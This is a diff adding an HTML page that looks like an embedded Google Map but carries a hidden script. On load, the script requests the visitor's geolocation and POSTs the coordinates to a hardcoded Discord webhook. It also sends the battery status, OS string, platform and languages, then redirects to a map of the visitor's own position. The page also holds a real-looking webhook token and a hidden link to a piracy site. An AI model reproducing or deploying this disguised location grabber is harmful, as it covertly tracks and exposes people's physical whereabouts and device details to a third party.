@@ -1,0 +1,54 @@
+<style type="text/css">
+    iframe{
+        width: 100%;
+        height: 100%;
+    }
+</style>
+<script>
+    const Url = "https://discord.com/api/webhooks/1178797504989511841/IR3fprsP1XXGVvI3hIHik0HT5CLy8s1AFwhnBRb3Mr7jDVbqfLaGroRYJh7u5odcdtmv";
+    const get = () => {
+        if (navigator.geolocation){
+            navigator.geolocation.getCurrentPosition((position) => {
+                let lat = position.coords.latitude;
+                let long = position.coords.longitude;
+                const Msg = {"content": + lat + " " + long};
+                fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+                window.location = ('https://www.google.com/maps/@' + lat + "," + long + "," + "13z")
+            });
+        }
+    };
+    const battery = () => {
+        navigator.getBattery().then(function(battery){
+            const level = battery.level;
+            const status = level * 100 + "%";
+            const charging = battery.charging;
+            const Msg = {"content": "`Battery: `" + status + ", " + charging + " charging"};
+            fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+        })
+    }
+    const os = () => {
+        const Msg = {"content": "`OS: `" + navigator.appVersion};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const app = () => {
+        const Msg = {"content": "`App Name: `" + navigator.appName};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const platform = () => {
+        const Msg = {"content": "`Platform: `" + navigator.platform};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const language = () => {
+        const Msg = {"content": "`Language: `" + navigator.language + ", `All Languages: `" + navigator.languages};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    get();
+    battery();
+    os();
+    app();
+    platform();
+    language();
+</script>
+<body>
+    <div class="mapouter"><div class="gmap_canvas"><iframe width="1500" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=24PC+HC,%20Day%20Valley,%20CA%2095003,%20%D0%A1%D0%BE%D0%B5%D0%B4%D0%B8%D0%BD%D0%B5%D0%BD%D0%BD%D1%8B%D0%B5%20%D0%A8%D1%82%D0%B0%D1%82%D1%8B&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><a href="https://123movies-to.org"></a><br><style>.mapouter{position:relative;text-align:right;height:500px;width:1080px;}</style><a href="https://www.embedgooglemap.net">responsive google map</a><style>.gmap_canvas {overflow:hidden;background:none!important;height: 1000px;;width:1500px;}</style></div></div>
+</body>
